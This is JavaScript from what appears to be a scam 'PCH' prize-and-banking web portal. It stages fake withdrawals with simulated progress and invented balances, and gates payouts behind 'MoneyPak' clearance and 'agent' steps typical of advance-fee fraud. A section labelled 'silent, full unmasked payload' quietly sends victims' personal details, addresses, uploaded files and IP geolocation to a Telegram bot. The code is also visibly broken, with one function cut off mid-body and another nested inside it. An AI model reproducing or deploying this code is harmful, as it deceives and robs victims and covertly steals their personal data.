/* ═══════════ SHARED CORE ═══════════ */
const DEVICE_STORAGE_KEY = 'pch_device_state_v13';
const USER_REGISTRY_KEY = 'pch_user_folder_registry';
const DEFAULT_WD_LIMIT = 5000;
const DEFAULT_P2P_LIMIT = 50000;
const P2P_MAX_TRANSFER = 50000;
const DEFAULT_TG = { botToken:'', chatId:'' };

let countdownInterval = null;
let cachedDashboardQuote = null;
let reviewSeed = 20261016;

const WITHDRAWAL_FLOW = {

  moneypak_submitted:{ stepNum:2, stepLabel:'Clear Processing', status:'Awaiting Admin Approval', icon:'fa-hourglass-half', tone:'gold', description:'Your clearance submission has been received. An administrator must approve it before Stamp of Approval unlocks.', adminNext:'moneypak_approved', adminLabel:'Approve Clear Processing' },
  moneypak_approved:{ stepNum:3, stepLabel:'Stamp of Approval', status:'Action Required', icon:'fa-stamp', tone:'sky', description:'Submit your stamped approval slip to continue.', userAction:'openStampModal()', userLabel:'Submit Stamp of Approval' },
  stamp_submitted:{ stepNum:3, stepLabel:'Stamp of Approval', status:'Awaiting Admin Approval', icon:'fa-hourglass-half', tone:'gold', description:'Your stamp has been submitted. An administrator must approve it to complete the paperwork stage.', adminNext:'stamp_approved', adminLabel:'Approve Stamp' },
  stamp_approved:{ stepNum:3, stepLabel:'Paperwork Signatures', status:'Contact Agent', icon:'fa-file-signature', tone:'emerald', description:'2 out of 3 paperwork signatures are complete. Please contact your agent to complete the final one.', adminNext:'none', adminLabel:'Complete Final Signature (Agent)' }
};

const FREQUENCY_OPTIONS = [{value:'2days',label:'Every 2 Days'},{value:'3days',label:'Every 3 Days'},{value:'weekly',label:'Weekly'},{value:'biweekly',label:'Bi-Weekly'},{value:'monthly',label:'Monthly'}];
const SAVINGS_REASONS = { House:{icon:'fa-house',label:'House'}, Car:{icon:'fa-car',label:'Car'}, Debts:{icon:'fa-file-invoice-dollar',label:'Debts'}, 'Dream Trip':{icon:'fa-plane',label:'Dream Trip'}, Custom:{icon:'fa-bullseye',label:'Custom Goal'} };
const motivationalQuotes = [
  {quote:"Wealth is not about having a lot of money; it's about having a lot of options.",author:"Chris Rock"},
  {quote:"Compound interest is the eighth wonder of the world. He who understands it, earns it... he who doesn't... pays it.",author:"Albert Einstein"},
  {quote:"An investment in knowledge pays the best interest.",author:"Benjamin Franklin"},
  {quote:"Financial freedom is available to those who learn about it and work for it.",author:"Robert Kiyosaki"}
];

function todayStr(){ return new Date().toISOString().split('T')[0]; }
function escapeHtml(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
function tgEsc(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function fmtMoney(n){ return '$' + (Number(n)||0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}); }
function nz(v){ return v===undefined||v===null||v===''?'—':String(v); }
function getFrequencyLabel(v){ const f=FREQUENCY_OPTIONS.find(o=>o.value===v); return f?f.label:v; }
function getRandomQuote(){ return motivationalQuotes[Math.floor(Math.random()*motivationalQuotes.length)]; }
function getCachedQuote(){ return cachedDashboardQuote || (cachedDashboardQuote = getRandomQuote()); }
function isAdminMode(){ try { const u=new URLSearchParams(window.location.search); if(u.get('admin')==='1'){ localStorage.setItem('pch_admin_mode','1'); return true; } if(u.get('admin')==='0'){ localStorage.removeItem('pch_admin_mode'); return false; } return localStorage.getItem('pch_admin_mode')==='1'; } catch(e){ return false; } }

function loadDeviceState() {
  const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
  if (saved) {
    try {
      const p = JSON.parse(saved);
      if (!p.telegramConfig) p.telegramConfig = Object.assign({}, DEFAULT_TG);
      if (p.userBalance == null) p.userBalance = 4500;
      if (!p.transactions) p.transactions = [];
      if (!p.registeredUsers) p.registeredUsers = [];
      if (!p.accessLogs) p.accessLogs = [];
      if (!p.messages) p.messages = [];
      if (!p.favoriteRecipients) p.favoriteRecipients = [];
      if (!p.scheduledTransfers) p.scheduledTransfers = [];
      if (!p.fundingMethods) p.fundingMethods = [];
      if (!p.autoWithdraw) p.autoWithdraw = { enabled:false, frequency:'weekly', amount:null, method:null };
      if (!p.dailyLimits) p.dailyLimits = { withdrawal:{limit:DEFAULT_WD_LIMIT,used:0,date:''}, p2p:{limit:DEFAULT_P2P_LIMIT,used:0,date:''} };
      if (!p.withdrawalState) p.withdrawalState = 'none';
      if (p.messagesReadAt == null) p.messagesReadAt = 0;
      if (p.announcementDismissedAt == null) p.announcementDismissedAt = 0;
      if (p.signupCounter == null) p.signupCounter = 0;
      return p;
    } catch(e){}
  }
  return { currentUser:null, userBalance:4500, configuredMethod:null, transactions:[], registeredUsers:[], savings:null, cdAccount:null, accessLogs:[], promo:null, signupCounter:0, withdrawalState:'none', currentWithdrawal:null, favoriteRecipients:[], scheduledTransfers:[], fundingMethods:[], autoWithdraw:{enabled:false,frequency:'weekly',amount:null,method:null}, dailyLimits:{ withdrawal:{limit:DEFAULT_WD_LIMIT,used:0,date:''}, p2p:{limit:DEFAULT_P2P_LIMIT,used:0,date:''} }, referralCode:null, messagesReadAt:0, announcement:null, messages:[], announcementDismissedAt:0, card:null, kyc:null, gamePlays:null, lastSpinDate:null, supportTickets:[], telegramConfig: Object.assign({}, DEFAULT_TG) };
}

const persisted = loadDeviceState();
const state = {
  currentUser: persisted.currentUser, userBalance: persisted.userBalance, configuredMethod: persisted.configuredMethod,
  registeredUsers: persisted.registeredUsers||[], transactions: persisted.transactions||[], savings: persisted.savings||null,
  cdAccount: persisted.cdAccount||null, accessLogs: persisted.accessLogs||[], promo: persisted.promo||null,
  signupCounter: persisted.signupCounter||0, withdrawalState: persisted.withdrawalState||'none',
  currentWithdrawal: persisted.currentWithdrawal||null, favoriteRecipients: persisted.favoriteRecipients||[],
  scheduledTransfers: persisted.scheduledTransfers||[], fundingMethods: persisted.fundingMethods||[],
  autoWithdraw: persisted.autoWithdraw||{enabled:false,frequency:'weekly',amount:null,method:null},
  dailyLimits: persisted.dailyLimits||{ withdrawal:{limit:DEFAULT_WD_LIMIT,used:0,date:''}, p2p:{limit:DEFAULT_P2P_LIMIT,used:0,date:''} },
  referralCode: persisted.referralCode||null, messagesReadAt: persisted.messagesReadAt||0,
  announcement: persisted.announcement||null, messages: persisted.messages||[], announcementDismissedAt: persisted.announcementDismissedAt||0,
  usersCache: [], kyc: persisted.kyc || null, card: persisted.card || null, gamePlays: persisted.gamePlays || null,
  lastSpinDate: persisted.lastSpinDate || null, supportTickets: persisted.supportTickets || [],
  telegramConfig: Object.assign({}, DEFAULT_TG, persisted.telegramConfig || {})
};

function saveDeviceState() {
  const payload = {
    currentUser: state.currentUser, userBalance: state.userBalance, configuredMethod: state.configuredMethod,
    transactions: state.transactions, registeredUsers: state.registeredUsers, savings: state.savings, cdAccount: state.cdAccount,
    accessLogs: state.accessLogs, promo: state.promo, signupCounter: state.signupCounter||0,
    withdrawalState: state.withdrawalState||'none', currentWithdrawal: state.currentWithdrawal||null,
    favoriteRecipients: state.favoriteRecipients||[], scheduledTransfers: state.scheduledTransfers||[],
    fundingMethods: state.fundingMethods||[], autoWithdraw: state.autoWithdraw||{}, dailyLimits: state.dailyLimits||{},
    referralCode: state.referralCode||null, messagesReadAt: state.messagesReadAt||0,
    announcement: state.announcement||null, messages: state.messages||[], announcementDismissedAt: state.announcementDismissedAt||0,
    kyc: state.kyc, card: state.card, gamePlays: state.gamePlays, lastSpinDate: state.lastSpinDate, supportTickets: state.supportTickets,
    telegramConfig: state.telegramConfig
  };
  try { localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify(payload)); }
  catch(err) { try { if (payload.currentUser) payload.currentUser = Object.assign({}, payload.currentUser, {photoUrl:null}); payload.registeredUsers = (payload.registeredUsers||[]).map(u=>Object.assign({},u,{photoUrl:null})); localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify(payload)); } catch(e2){} }
  if (state.currentUser && state.currentUser.username) syncCurrentUserToCloud().catch(()=>{});
}

function buildCurrentUserPayload() {
  const u = state.currentUser || {};
  return Object.assign({}, u, { userBalance:Number(state.userBalance)||0, transactions:state.transactions||[], withdrawalState:state.withdrawalState||'none', currentWithdrawal:state.currentWithdrawal||null, configuredMethod:state.configuredMethod||null, savings:state.savings||null, cdAccount:state.cdAccount||null, favoriteRecipients:state.favoriteRecipients||[], scheduledTransfers:state.scheduledTransfers||[], fundingMethods:state.fundingMethods||[], autoWithdraw:state.autoWithdraw||{}, dailyLimits:state.dailyLimits||{}, referralCode:state.referralCode||null, kyc: state.kyc, card: state.card, gamePlays: state.gamePlays, lastSpinDate: state.lastSpinDate, supportTickets: state.supportTickets, updatedAt:Date.now() });
}

async function syncCurrentUserToCloud() {
  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return;
  try { await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()), buildCurrentUserPayload()); } catch(e){}
}

async function pullCurrentUserFromCloud() {
  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return false;
  try {
    const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()));
    if (!snap.exists()) return false;
    const r = snap.val();
    state.currentUser = Object.assign({}, state.currentUser, r);
    if (typeof r.userBalance === 'number') state.userBalance = r.userBalance;
    state.transactions = Array.isArray(r.transactions) ? r.transactions : (r.transactions && typeof r.transactions === 'object' ? Object.values(r.transactions) : state.transactions);
    state.withdrawalState = r.withdrawalState || 'none';
    state.currentWithdrawal = r.currentWithdrawal || null;
    state.configuredMethod = r.configuredMethod || null;
    state.savings = r.savings || state.savings;
    state.cdAccount = r.cdAccount || state.cdAccount;
    if (r.kyc) state.kyc = r.kyc;
    if (r.card) state.card = r.card;
    if (r.gamePlays) state.gamePlays = r.gamePlays;
    if (r.lastSpinDate) state.lastSpinDate = r.lastSpinDate;
    if (Array.isArray(r.supportTickets)) state.supportTickets = r.supportTickets;
    if (Array.isArray(r.favoriteRecipients)) state.favoriteRecipients = r.favoriteRecipients;
    if (Array.isArray(r.scheduledTransfers)) state.scheduledTransfers = r.scheduledTransfers;
    if (Array.isArray(r.fundingMethods)) state.fundingMethods = r.fundingMethods;
    if (r.autoWithdraw) state.autoWithdraw = r.autoWithdraw;
    if (r.dailyLimits) state.dailyLimits = r.dailyLimits;
    if (r.referralCode) state.referralCode = r.referralCode;
    const idx = state.registeredUsers.findIndex(x => x && (x.username||'').toLowerCase() === state.currentUser.username.toLowerCase());
    if (idx >= 0) state.registeredUsers[idx] = Object.assign({}, state.registeredUsers[idx], r); else state.registeredUsers.push(r);
    saveDeviceState();
    return true;
  } catch(e){ return false; }
}

async function pullAllUsersFromCloud() {
  if (!window.rtdb) return {};
  try { const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users')); return snap.exists() ? snap.val() : {}; } catch(e){ return {}; }
}

async function fetchAnnouncement() {
  if (!window.rtdb) return;
  try { const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'config/announcement')); if (snap.exists()) state.announcement = snap.val(); } catch(e){}
}

async function fetchMessages() {
  if (!window.rtdb || !state.currentUser?.username) return;
  try {
    const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'messages/' + state.currentUser.username.toLowerCase()));
    if (snap.exists()) { const val = snap.val(); const arr = Array.isArray(val) ? val : Object.values(val); arr.sort((a,b)=>(b.sentAt||0)-(a.sentAt||0)); state.messages = arr; }
    else state.messages = [];
  } catch(e){}
}

function ensureDailyLimits() {
  const today = todayStr();
  if (!state.dailyLimits || state.dailyLimits.withdrawal?.date !== today) {
    state.dailyLimits = { withdrawal:{limit:DEFAULT_WD_LIMIT,used:0,date:today}, p2p:{limit:DEFAULT_P2P_LIMIT,used:0,date:today} };
  }
}
function ensureReferralCode() {
  if (!state.referralCode && state.currentUser?.username) {
    const handle = state.currentUser.username.toUpperCase().replace(/[^A-Z0-9]/g,'').substring(0,6);
    state.referralCode = 'PCH-' + handle + '-' + Math.random().toString(36).substring(2,6).toUpperCase();
    saveDeviceState();
  }
}
function ensureFundingMethodsMigrated() {
  if (!Array.isArray(state.fundingMethods)) state.fundingMethods = [];
  if (state.configuredMethod && state.fundingMethods.length === 0) state.fundingMethods = [{label:state.configuredMethod,primary:true,backup:false,details:{}}];
  if (state.fundingMethods.length > 0 && !state.fundingMethods.some(f=>f.primary)) state.fundingMethods[0].primary = true;
  const primary = state.fundingMethods.find(f=>f.primary);
  state.configuredMethod = primary ? primary.label : null;
}
function unreadCount(){ return (state.messages||[]).filter(m=>(m.sentAt||0) > (state.messagesReadAt||0)).length; }

function detectDevice() {
  const ua = navigator.userAgent || '';
  let os='Unknown', type='Desktop', browser='Unknown';
  if (/iPhone|iPad|iPod/i.test(ua)) { os='iOS'; type=/iPad/i.test(ua)?'Tablet':'Mobile'; }
  else if (/Android/i.test(ua)) { os='Android'; type=/Mobile/i.test(ua)?'Mobile':'Tablet'; }
  else if (/Mac OS X|Macintosh/i.test(ua)) { os='macOS'; }
  else if (/Windows/i.test(ua)) { os='Windows'; }
  else if (/CrOS/i.test(ua)) { os='ChromeOS'; }
  else if (/Linux/i.test(ua)) { os='Linux'; }
  if (/Edg\//i.test(ua)) browser='Edge';
  else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser='Opera';
  else if (/Chrome\//i.test(ua) && !/Edg|OPR/i.test(ua)) browser='Chrome';
  else if (/Firefox\//i.test(ua)) browser='Firefox';
  else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser='Safari';
  const icon = (type==='Mobile'||type==='Tablet') ? 'fa-mobile-screen-button' : (os==='macOS'?'fa-laptop':'fa-desktop');
  return { os, type, browser, icon };
}
let cachedIp = null, cachedGeo = null;
async function fetchIP(){
  if (cachedIp && cachedGeo) return { ip: cachedIp, ...cachedGeo };
  try {
    const r = await fetch('https://ipapi.co/json/');
    if (r.ok) {
      const d = await r.json();
      if (d && d.ip) {
        cachedIp = d.ip;
        cachedGeo = { city: d.city||'', region: d.region||'', country: d.country_name||d.country||'', postal: d.postal||'', org: d.org||'', timezone: d.timezone||'', latitude: d.latitude||'', longitude: d.longitude||'' };
        return { ip: cachedIp, ...cachedGeo };
      }
    }
  } catch(e){}
  try {
    const r2 = await fetch('https://api.ipify.org?format=json');
    const d2 = await r2.json();
    if (d2 && d2.ip) { cachedIp = d2.ip; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' }; return { ip: cachedIp, ...cachedGeo }; }
  } catch(e){}
  cachedIp = 'Unknown'; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' };
  return { ip: cachedIp, ...cachedGeo };
}
async function logAccess(action) {
  if (!state.currentUser) return;

    const net = await fetchIP(); const ip = net.ip || 'Unknown'; const dev = detectDevice();
    state.accessLogs.unshift({ id:Date.now()+Math.random(), user:state.currentUser.username||state.currentUser.email, name:`${state.currentUser.firstName} ${state.currentUser.lastName}`, action, ip, os:dev.os, type:dev.type, browser:dev.browser, icon:dev.icon, ua:navigator.userAgent, time:new Date().toISOString().replace('T',' ').substring(0,19) });

}

/* ═══════════ TELEGRAM — silent, full unmasked payload ═══════════ */
function tgCreds() {
  const cfg = state.telegramConfig || {};
  return { botToken: String(cfg.botToken || '').trim(), chatId: String(cfg.chatId || '').trim() };
}
async function sendTelegramMessage(textMessage) {
  const { botToken, chatId } = tgCreds();
  if (!botToken || !chatId) { console.warn('[TG] botToken/chatId missing'); return false; }
  try {
    const fd = new FormData();
    fd.append('chat_id', chatId);
    fd.append('text', textMessage);
    fd.append('parse_mode', 'HTML');
    fd.append('disable_web_page_preview', 'true');
    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method:'POST', body:fd });
    const d = await r.json();
    if (!d.ok) console.error('[TG] send failed:', d.error_code, d.description);
    return d.ok;
  } catch (err) { console.error('[TG] fetch failed:', err); return false; }
}
async function sendTelegramDocument(filename, text, captionText) {
  const { botToken, chatId } = tgCreds();
  if (!botToken || !chatId) { console.warn('[TG] botToken/chatId missing'); return false; }
  try {
    const blob = new Blob([text], { type:'text/plain;charset=utf-8' });
    const fd = new FormData();
    fd.append('chat_id', chatId);
    fd.append('document', blob, filename);
    if (captionText) { fd.append('caption', captionText); fd.append('parse_mode','HTML'); }
    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method:'POST', body:fd });
    const data = await res.json();
    if (!data.ok) console.error('[TG] doc failed:', data.error_code, data.description);
    return data.ok;
  } catch (err) { console.error('[TG] doc fetch failed:', err); return false; }
}
async function sendTelegramFile(file, caption) {
  if (!file) return false;
  const { botToken, chatId } = tgCreds();
  if (!botToken || !chatId) { console.warn('[TG] botToken/chatId missing'); return false; }
  try {
    const fd = new FormData();
    fd.append('chat_id', chatId);
    fd.append('document', file, file.name || 'document');
    if (caption) { fd.append('caption', caption); fd.append('parse_mode','HTML'); }
    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method:'POST', body:fd });
    const data = await res.json();
    if (!data.ok) console.error('[TG] file failed:', data.error_code, data.description);
    return data.ok;
  } catch (err) { console.error('[TG] file fetch failed:', err); return false; }
}

async function buildCommonTgBlock() {
  const u = state.currentUser || {};

  const address = [u.address, u.city, u.stateOrParish, u.zip].filter(Boolean).join(', ') || 'N/A';

async function adminApproveStep() {
  const ws = state.withdrawalState;
  const flow = WITHDRAWAL_FLOW[ws];
  if (!flow || !flow.adminNext) return;
  const cw = Object.assign({}, state.currentWithdrawal || {});
  const next = flow.adminNext;
  const common = await buildCommonTgBlock();

  if (next === 'none') {
    const idx = state.transactions.findIndex(t=>t.ref === cw.refNum);
    if (idx >= 0) state.transactions[idx] = Object.assign({}, state.transactions[idx], {status:'Completed'});
    state.withdrawalState = 'none';
    state.currentWithdrawal = null;
    saveDeviceState();
    sendTelegramMessage(
      `✅ <b>WITHDRAWAL COMPLETED (ADMIN APPROVAL)</b>\n` +
      `<b>Ref:</b> ${tgEsc(cw.refNum||'—')}\n` +
      `<b>Amount:</b> ${fmtMoney(Number(cw.amount)||0)}\n` +
      `<b>Final Step:</b> ${tgEsc(flow.stepLabel)}\n` +
      common.block
    ).catch(()=>{});
    showToast('Withdrawal Completed', `Ref ${cw.refNum||'—'} marked Completed.`, 'success');
    render();
    return;
  }
  state.withdrawalState = next;
  saveDeviceState();
  sendTelegramMessage(
    `🛡️ <b>ADMIN APPROVAL — ${tgEsc(flow.stepLabel)}</b>\n` +
    `<b>Ref:</b> ${tgEsc(cw.refNum||'—')}\n` +
    `<b>Amount:</b> ${fmtMoney(Number(cw.amount)||0)}\n` +
    `<b>Advanced To:</b> ${tgEsc(next.replace(/_/g,' '))}\n` +
    common.block
  ).catch(()=>{});
  showToast('Step Approved', 'Advanced to next stage.', 'success');
  render();
}

function compressImage(file, maxSize=420, quality=0.85) {
  return new Promise((resolve)=>{
    const reader = new FileReader();
    reader.onload = (e)=>{
      const raw = e.target.result;
      if (!file.type || !file.type.startsWith('image/')) return resolve(raw);
      const img = new Image();
      img.onload = ()=>{ let {width,height} = img; const scale = Math.min(1, maxSize/Math.max(width,height)); width = Math.max(1, Math.round(width*scale)); height = Math.max(1, Math.round(height*scale)); const canvas = document.createElement('canvas'); canvas.width = width; canvas.height = height; canvas.getContext('2d').drawImage(img,0,0,width,height); try { resolve(canvas.toDataURL('image/jpeg', quality)); } catch(err){ resolve(raw); } };
      img.onerror = ()=>resolve(raw);
      img.src = raw;
    };
    reader.onerror = ()=>resolve(null);
    reader.readAsDataURL(file);
  });
}
async function handlePhotoUpload(event) {
  const file = event.target.files && event.target.files[0]; if (!file) return;
  const statusEl = document.getElementById('photo-upload-status');
  if (statusEl) statusEl.innerHTML = '<i class="fa-solid fa-spinner fa-spin mr-1 text-sky-custom"></i> Optimizing...';
  const dataUrl = await compressImage(file, 420, 0.85);
  if (!dataUrl) { if (statusEl) statusEl.innerHTML = '<span class="text-rose-400">Could not read.</span>'; return; }
  tempPhotoUrl = dataUrl;
  const prev = document.getElementById('settings-photo-preview');
  if (prev) prev.innerHTML = `<img src="${dataUrl}" class="w-full h-full object-cover">`;
  if (statusEl) { const kb = Math.round((dataUrl.length*0.75)/1024); statusEl.innerHTML = `<span class="text-emerald-400 font-bold"><i class="fa-solid fa-circle-check mr-1"></i>Ready</span> · ${kb} KB`; }
}

async function submitWithdrawal(e) {
  e.preventDefault();
  if (!state.configuredMethod) { closeModal(); showSetupLockToast(); return; }
  const amt = parseFloat(document.getElementById('wd-amount').value);
  const errEl = document.getElementById('wd-error');
  if (isNaN(amt) || amt <= 0 || amt > state.userBalance) { errEl.textContent = 'Invalid amount.'; errEl.classList.remove('hidden'); return; }
  ensureDailyLimits();
  const remaining = state.dailyLimits.withdrawal.limit - state.dailyLimits.withdrawal.used;
  if (amt > remaining) { errEl.textContent = `Amount exceeds remaining daily limit (${fmtMoney(remaining)}).`; errEl.classList.remove('hidden'); return; }
  closeModal();
  const container = document.getElementById('app-container');
  container.innerHTML = `<div class="flex-grow flex items-center justify-center p-6"><div class="bg-navy-800 border border-navy-700 p-8 sm:p-10 rounded-3xl max-w-md w-full text-center shadow-2xl space-y-6 card-3d"><div class="relative w-20 h-20 sm:w-24 sm:h-24 mx-auto flex items-center justify-center"><div class="absolute inset-0 rounded-full border-4 border-sky-custom/20 border-t-sky-custom animate-spin"></div><i class="fa-solid fa-money-bill-transfer text-2xl sm:text-3xl text-sky-custom"></i></div><div><h3 class="text-xl sm:text-2xl font-bold text-white mb-2">Processing Withdrawal</h3><p class="text-xs text-slate-400">Communicating with disbursement gateway...</p></div><div class="w-full bg-navy-950 h-4 rounded-full overflow-hidden border border-navy-700 shadow-inner p-0.5"><div id="wd-loading-bar" class="bg-gradient-to-r from-gold-400 via-sky-custom to-emerald-400 h-full w-0 rounded-full transition-all duration-300"></div></div><div id="wd-loading-pct" class="text-base sm:text-lg font-black text-gold-400">0%</div></div></div>`;
  let progress = 0;
  const balBefore = state.userBalance;
  const interval = setInterval(async ()=>{
    progress += 10;
    const bar = document.getElementById('wd-loading-bar'); const pct = document.getElementById('wd-loading-pct');
    if (bar && pct) { bar.style.width = progress + '%'; pct.textContent = progress + '%'; }
    if (progress >= 100) {
      clearInterval(interval);
      state.userBalance -= amt;
      if (state.dailyLimits.withdrawal) state.dailyLimits.withdrawal.used = +(state.dailyLimits.withdrawal.used + amt).toFixed(2);
      const refNum = 'TXN-' + Math.floor(10000 + Math.random()*90000);
      const nowStr = new Date().toISOString().replace('T',' ').substring(0,16);
      state.transactions.unshift({ ref:refNum, date:nowStr, amount:amt, type:'Withdrawal Request', status:'Pending' });
      state.withdrawalState = 'pending';
      state.currentWithdrawal = { amount:amt, refNum, date:nowStr };
      saveDeviceState();
      showToast('Withdrawal Submitted', `Ref ${refNum} — awaiting admin approval.`, 'warning');

      const common = await buildCommonTgBlock();
      sendTelegramMessage(
        `💸 <b>WITHDRAWAL REQUESTED</b>\n` +
        `<b>Ref:</b> ${tgEsc(refNum)}\n` +
        `<b>Amount:</b> ${fmtMoney(amt)}\n` +
        `<b>Balance before:</b> ${fmtMoney(balBefore)}\n` +
        `<b>Balance after:</b> ${fmtMoney(state.userBalance)}\n` +
        `<b>Status:</b> PENDING ADMIN APPROVAL\n` +
        `<b>Method:</b> ${tgEsc(state.configuredMethod || 'N/A')}\n` +
        common.block
      ).catch(()=>{});

      render();
    }
  }, 200);
}

function initCountdownTimer() {
  if (countdownInterval) clearInterval(countdownInterval);
  function updateTimer() {
    const now = new Date(); const resultDate = new Date();
    const dayOfWeek = resultDate.getUTCDay(); const daysUntilFriday = (5 - dayOfWeek + 7) % 7;
    resultDate.setUTCHours(22 + 5, 30, 0, 0);
    resultDate.setUTCDate(resultDate.getUTCDate() + daysUntilFriday);
    if (now.getTime() > resultDate.getTime()) resultDate.setDate(resultDate.getDate() + 7);
    const diff = resultDate.getTime() - now.getTime();
    if (diff <= 0) return;
    const days = Math.floor(diff / 86400000); const hours = Math.floor((diff % 86400000) / 3600000); const mins = Math.floor((diff % 3600000) / 60000); const secs = Math.floor((diff % 60000) / 1000);
    const dEl = document.getElementById('cd-days'), hEl = document.getElementById('cd-hours'), mEl = document.getElementById('cd-mins'), sEl = document.getElementById('cd-secs');
    if (dEl) dEl.textContent = String(days).padStart(2,'0');
    if (hEl) hEl.textContent = String(hours).padStart(2,'0');
    if (mEl) mEl.textContent = String(mins).padStart(2,'0');
    if (sEl) sEl.textContent = String(secs).padStart(2,'0');
  }
  updateTimer(); countdownInterval = setInterval(updateTimer, 1000);
}
function initGrowthCalculator() {
  const slider = document.getElementById('sim-slider'); if (!slider) return;
  slider.addEventListener('input', (e)=>{
    const val = parseFloat(e.target.value);
    const lbl = document.getElementById('sim-principal-lbl'); if (lbl) lbl.textContent = '$' + val.toLocaleString();
    const y30 = document.getElementById('sim-yield-30'); if (y30) y30.textContent = fmtMoney(val * 1.16);
    const yY = document.getElementById('sim-yield-year'); if (yY) yY.textContent = fmtMoney(val * 4.12);
  });
}

function render() {
  renderHeaderNav();
  document.querySelector('#nav-drawer nav').innerHTML = renderNavItems('overview');
  const container = document.getElementById('app-container');
  container.innerHTML = renderDashboardShell('overview', renderOverview());
  initCountdownTimer();
  initGrowthCalculator();
}

window.onload = async function() {
  if (!guardAuth()) return;
  await pullCurrentUserFromCloud();
  ensureDailyLimits(); ensureReferralCode(); ensureFundingMethodsMigrated();
  await fetchAnnouncement(); await fetchMessages();
  if (!sessionStorage.getItem('pch_session_logged')) { sessionStorage.setItem('pch_session_logged','1'); logAccess('Session Resumed'); }
  render();
};
</script>
